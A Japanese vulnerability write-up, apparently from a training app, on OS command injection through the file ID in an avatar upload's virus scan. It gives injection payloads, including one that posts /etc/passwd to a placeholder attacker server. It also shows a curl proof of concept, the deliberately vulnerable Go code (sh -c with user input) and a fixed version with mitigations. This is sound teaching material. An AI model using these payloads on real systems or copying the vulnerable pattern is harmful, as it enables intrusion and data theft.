# OSコマンドインジェクション（アバターアップロード機能）

## 脆弱性の概要
アバターアップロード機能において、ユーザーが指定したファイルIDがウィルススキャン処理で適切にエスケープされずにOSコマンドに渡されるため、OSコマンドインジェクションの脆弱性が存在します。攻撃者はこの脆弱性を悪用して、サーバー上で任意のコマンドを実行することができます。

アバター画像データはデータベースに直接保存されますが、ウィルススキャンのために一時的にファイルシステムに保存される際に脆弱性が発生します。

## 影響
この脆弱性が悪用された場合、以下のような影響があります：
- サーバー上での任意のコマンド実行
- 機密情報の漏洩
- サーバーの乗っ取り
- サービス拒否攻撃（DoS）

## 攻撃方法
1. プロフィール編集画面でアバター画像をアップロードする際に、ファイルIDに悪意のあるコマンドを含める
    -  例えば、以下のようなファイルIDを使用する：
        - `avatar.jpg; ls -la /`
        - `avatar.jpg && cat /etc/passwd`
        - `avatar.jpg | curl -X POST -d @/etc/passwd https://攻撃者のサーバー/`
2. curlでファイルアップロードを実行する例
```bash
curl 'http://localhost:9090/api/profile/avatar' \
  -H 'Authorization: Bearer alice_token' \
  -H 'Content-Type: application/json' \
  --data-raw '{
    "file_id":"avatar.jpg && cat /etc/passwd",
    "image_data":"R0lGODlhAQABAIAAAP///////yH+BnBzYV9sbAAh+QQBCgABACwAAAAAAQABAAACAkwBADs="
  }'
```
4. `malware_scan`というフィールドにOSコマンドの出力結果が返却されます


## 実装の詳細
アバター画像データはBase64エンコードされた形式でデータベースに直接保存されます。ただし、ウィルススキャンを行うために、一時的にファイルシステムに保存されます。この一時ファイルは処理完了後に削除されますが、ウィルススキャン処理中に脆弱性が発生します。

## 脆弱なコード
```go
func (h *Handler) UploadAvatar(c *gin.Context) {
    // ... 省略 ...
    
	// 一時ファイルの保存（ウィルススキャン用）
	tempFileName := fmt.Sprintf("%d.png", time.Now().Unix())
	filePath := filepath.Join(uploadDir, tempFileName)
	if err := os.WriteFile(filePath, imageData, 0644); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save temporary file"})
		return
	}
	defer os.Remove(filePath) // 処理完了後に一時ファイルを削除

	// 脆弱性: OSコマンドインジェクション
	// ユーザー入力（FileID）を適切にエスケープせずにコマンドに渡している
	scanResult, err := scanFile(filePath, req.FileID)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Virus detected or scan failed", "scan_result": scanResult})
		return
	}
    
    // ... 省略 ...
}

func scanFile(filePath string, fileID string) (string, error) {
	// 脆弱性: OSコマンドインジェクション
	// ユーザー入力（fileID）を適切にエスケープせずにコマンドに渡している
	cmd := exec.Command("sh", "-c", "echo 'Scanning file: ' && echo "+fileID)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), fmt.Errorf("ウィルスが検出されました: fileID=%s, filePath=%s", fileID, filePath)
	}
	return string(output), nil
}

```

## 対策方法
1. OSコマンドを使用せずに、プログラム内部でファイルの検査を行う
2. 必要に応じてOSコマンドを使用する場合は、以下の対策を行う：
   - ユーザの入力値は基本的にコマンドライン引数に渡さない
   - ユーザの入力値をバリデーションする
   - ユーザー入力を適切にエスケープする
   - シェル（sh, bash）を介さずに直接コマンドを実行する

### 修正例
```go
// データベースに直接保存する実装
func (h *Handler) UploadAvatar(c *gin.Context) {
    // ... 省略 ...
    
    // 一時ファイルを作成せずにメモリ上でスキャン
    // または、一時ファイルを作成する場合は安全なファイル名を使用
    tempFile, err := os.CreateTemp("", "safe-prefix-*.jpg")
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create temporary file"})
        return
    }
    defer os.Remove(tempFile.Name())
    
    if _, err := tempFile.Write(imageData); err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to write to temporary file"})
        return
    }
    tempFile.Close()
    
    // 安全なスキャン処理
    if err := scanFileSafely(tempFile.Name()); err != nil {
        c.JSON(http.StatusBadRequest, gin.H{"error": "Virus detected or scan failed"})
        return
    }
    
    // ... 省略 ...
}

func scanFileSafely(filePath string) error {
    // 修正: 引数を配列として渡し、シェルを介さずに実行
    cmd := exec.Command("grep", "-q", "virus_signature", filePath)
    err := cmd.Run()
    if err != nil {
        if exitErr, ok := err.(*exec.ExitError); ok && exitErr.ExitCode() == 1 {
            // grepコマンドがパターンを見つけられなかった場合（終了コード1）は正常とみなす
            return nil
        }
        log.Printf("ウィルススキャンエラー: %v", err)
        return err
    }
    return fmt.Errorf("ウィルスが検出されました")
}
```

## 参考情報
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
